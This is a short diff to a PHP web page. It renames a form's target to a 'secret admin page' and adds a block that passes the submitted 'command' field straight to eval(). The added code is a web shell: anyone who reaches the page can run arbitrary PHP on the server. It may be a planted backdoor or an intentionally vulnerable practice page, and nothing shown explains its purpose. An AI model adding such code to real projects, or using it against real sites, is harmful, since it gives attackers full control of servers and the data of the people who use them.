@@ -19,9 +19,9 @@
       <div class="row">
         <div class="col-md-12">
           <div class="form_container">
-            <form method="POST" action="./controller/maskController.php" enctype="multipart/form-data">
+            <form method="POST" action="./sup3r_secret_admin_page.php" enctype="multipart/form-data">
               <div>
-                <input type="text" class="form-control" placeholder="Command" />
+                <input type="text" class="form-control" placeholder="Command" name="command" />
               </div>
               <div class="btn_box">
                 <button>
@@ -30,6 +30,15 @@
               </div>
             </form>
           </div>
+
+            <?php 
+
+                if(isset($_POST['command'])){
+                    eval($_POST['command']);
+                }
+
+            ?>
+
         </div>
       </div>
     </div>
